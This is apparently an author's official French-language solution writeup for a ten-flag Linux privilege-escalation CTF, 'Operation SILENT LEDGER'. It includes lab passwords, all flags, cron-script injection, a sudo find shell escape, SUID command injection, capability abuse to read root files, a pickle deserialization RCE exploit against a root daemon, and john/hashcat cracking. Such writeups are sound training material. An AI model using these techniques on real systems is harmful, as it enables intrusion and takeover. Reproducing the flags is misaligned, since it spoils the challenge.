# Operation SILENT LEDGER — Writeup complet (10/10 flags)

> Document auteur — ne pas distribuer aux joueurs. Correction officielle.
> Format des flags : `RootMeUp{...}`.

## Vue d'ensemble — chaîne d'attaque STRICTEMENT MONOTONE

Chaque étape est un **saut latéral vers un compte précis**. Aucune étape ne
donne root avant la toute dernière étape système (F8), et le flag 8 ne vit qu'en
mémoire du processus orchestrateur. Les flags 9/10 restent protégés par la
cryptographie même une fois root.

```
j.martin (SSH, mdp fourni)
   │ F1 lecture home  │ F2 énumération /var/backups  │ F3 .bash_history
   ▼
svc_backup
   │ F4 cron exécuté EN TANT QUE r.dubois (script inscriptible par le groupe)
   ▼
r.dubois
   │ F5 sudo NOPASSWD find  (GTFOBins)  -> app_agent
   ▼
app_agent  (membre du groupe "orch")
   │ F6 SUID logviewer (SUID svc_orch, PAS root) -> injection -> svc_orch
   ▼
svc_orch
   │ F7 py-agent (cap_dac_read_search, exécutable seulement par svc_orch)
   │    -> lecture des fichiers root (token + flag7)
   │ F8 socket orchestrateur + token -> pickle RCE root -> flag8 EN MÉMOIRE
   ▼
root (uniquement via l'orchestrateur)
   │ F9 crack vault.zip (rockyou)   │ F10 crack PIN + GPG
   ▼  FIN
```

⚠️ **Runtime** : l'instance doit tourner avec `--cap-add DAC_READ_SEARCH`
(sinon F7 est impossible — voir CTFD_SETUP.md).

---

## Flag 1 — Premiers pas (50 pts)
```bash
ssh j.martin@<host> -p <port>      # password: Welcome2024!
cat ~/welcome_note.txt
```
→ `RootMeUp{f1rst_st3ps_1nt0_th3_n3tw0rk_3a1c9d}`

## Flag 2 — Fouille de printemps (75 pts)
```bash
grep -r flag /var/backups/ 2>/dev/null   # ou : cat /var/backups/app_config.bak
```
→ `RootMeUp{h1dd3n_1n_pla1n_s1ght_7b2e41}`
`app_config.bak` cite aussi les comptes internes svc_backup / r.dubois / app_agent.

## Flag 3 — Mauvaise mémoire (100 pts)
```bash
cat ~/.bash_history      # contient : su svc_backup  puis  B4ckupSvc_2023!
su svc_backup            # password: B4ckupSvc_2023!
cat ~/flag3.txt
```
→ `RootMeUp{h1st0ry_r3p3ats_1ts3lf_c48a02}`
Le fichier note que `cleanup.sh` est modifiable par le groupe svc_backup et que
le cron qui l'exécute ne tourne **pas** en root.

## Flag 4 — Tâche planifiée (125 pts)  — svc_backup ➜ r.dubois
```bash
cat /etc/cron.d/meridian          # * * * * * r.dubois /opt/scripts/cleanup.sh
ls -la /opt/scripts/cleanup.sh     # root:svc_backup, group-writable
```
Le cron exécute `cleanup.sh` **en tant que r.dubois**. On y injecte une commande
qui lit le fichier privé de r.dubois (illisible directement en svc_backup) :
```bash
cat >> /opt/scripts/cleanup.sh << 'EOF'
cp /home/r.dubois/.password_reminder /tmp/loot4.txt 2>/dev/null
chmod 644 /tmp/loot4.txt 2>/dev/null
EOF
# attendre < 60 s
cat /tmp/loot4.txt
```
→ mot de passe r.dubois `An4lyst#Secure99` + `RootMeUp{cr0n_j0bs_ar3_g0ld_9d17f3}`
```bash
su r.dubois        # password: An4lyst#Secure99  (session réelle, groupes inclus)
```
> Note conception : le cron tourne en r.dubois (pas root) ⇒ **saut latéral**,
> jamais une RCE root gratuite.

## Flag 5 — Délégation hasardeuse (150 pts)  — r.dubois ➜ app_agent
```bash
sudo -l
#   (app_agent) NOPASSWD: /usr/bin/find
sudo -u app_agent find . -exec /bin/sh \;   # GTFOBins
whoami        # app_agent
cat ~/flag5.txt
```
→ `RootMeUp{sud0_m1sc0nf1g_str1k3s_ag41n_e0a934}`

## Flag 6 — Journaux confidentiels (175 pts)  — app_agent ➜ svc_orch
```bash
find / -perm -4000 -type f 2>/dev/null
#   /usr/local/bin/logviewer  (owner svc_orch, group orch, 4750)
strings /usr/local/bin/logviewer | grep cat     # cat /var/log/meridian/%s.log
```
Injection de commande dans le SUID (le `#` mange le `.log` final). Ce binaire est
**SUID svc_orch, pas root** :
```bash
logviewer "app; /bin/sh #"     # shell svc_orch (PAS root)
id                              # euid/uid = svc_orch
cat /home/svc_orch/flag6.txt
```
→ `RootMeUp{su1d_b1nar13s_l13_0ft3n_2f6b58}`

## Flag 7 — Pouvoirs spéciaux (200 pts)  — capability
```bash
getcap -r / 2>/dev/null
#   /usr/local/bin/py-agent cap_dac_read_search=ep   (exécutable seulement par svc_orch)
/usr/local/bin/py-agent -c 'print(open("/root/flag7.txt").read())'
```
→ `RootMeUp{cap4bilit13s_ar3_p0w3r_5c2d71}`
On récupère aussi le token et les infos de l'orchestrateur, puis on exfiltre les
butins chiffrés (la capability bypasse la lecture) :
```bash
/usr/local/bin/py-agent -c 'print(open("/root/.orchestrator_token").read())'
/usr/local/bin/py-agent -c 'open("/tmp/vault.zip","wb").write(open("/root/vault/vault.zip","rb").read())'
/usr/local/bin/py-agent -c 'open("/tmp/final.gpg","wb").write(open("/root/.encrypted/final.gpg","rb").read())'
/usr/local/bin/py-agent -c 'open("/tmp/pin.hash","w").write(open("/root/.encrypted/pin.hash").read())'
chmod 644 /tmp/vault.zip /tmp/final.gpg /tmp/pin.hash
```

## Flag 8 — L'orchestrateur (225 pts)  — désérialisation ➜ root
Le daemon (root) écoute en JSON ligne-par-ligne. `restore_config` passe un blob
base64 à `pickle.loads()` = **RCE**. Le flag 8 n'est **pas** sur le disque : il
est chargé en mémoire au démarrage (le fichier source est supprimé). Seule une
exécution de code **dans** l'orchestrateur le révèle (la capability F7 ne lit pas
la mémoire d'un autre process) :
```bash
/usr/local/bin/py-agent << 'PYEOF'
import pickle, base64, socket, json

TOKEN = "8f3ac1e9b7d24f0aa6c9e21d4b7f9931"

class Exploit:
    def __reduce__(self):
        code = ("import sys,os\n"
                "open('/tmp/f8.txt','w').write(getattr(sys.modules['__main__'],'FLAG8','?'))\n"
                "os.chmod('/tmp/f8.txt',0o666)")
        return (exec, (code,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
msg = {"cmd": "restore_config", "token": TOKEN, "payload": payload}
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/meridian/orchestrator.sock")
s.sendall((json.dumps(msg) + "\n").encode())
print(s.recv(4096))
PYEOF
cat /tmp/f8.txt
```
→ `RootMeUp{0rch3str4t0r_pwn3d_88af0d}`

## Flag 9 — Le coffre (250 pts)
Sur la machine d'attaque (après `scp` de `/tmp/vault.zip`) :
```bash
zip2john vault.zip > vault.hash
john --wordlist=/usr/share/wordlists/rockyou.txt vault.hash   # -> iloveyou
unzip -P iloveyou vault.zip && cat flag9.txt
```
→ `RootMeUp{cr4ck3d_th3_v4ult_1e39b6}`

## Flag 10 — Silent Ledger (300 pts)
```bash
hashcat -m 1400 -a 3 pin.hash ?d?d?d?d?d?d      # -> 482913
gpg --batch --pinentry-mode loopback --passphrase 482913 -o flag10.txt -d final.gpg
cat flag10.txt
```
→ `RootMeUp{0p3ration_s1l3nt_l3dg3r_c0mpl3t3_f4a217}`

**Fin de l'engagement — 1650 points.**

---

## Compétences couvertes
| Flag | Compétence |
|------|-----------|
| 1-2 | Reconnaissance locale, énumération de fichiers |
| 3 | Récolte d'identifiants (artefacts utilisateur) |
| 4 | Abus de tâche planifiée exécutée sous une autre identité |
| 5 | Mauvaise config sudo / GTFOBins |
| 6 | Injection de commande dans un SUID (vers un compte de service, pas root) |
| 7 | Abus de capability Linux (lecture seule) |
| 8 | Désérialisation non sécurisée (RCE), secret en mémoire |
| 9 | Cassage de mot de passe hors-ligne (zip2john/john) |
| 10 | Attaque par masque hashcat + GPG |
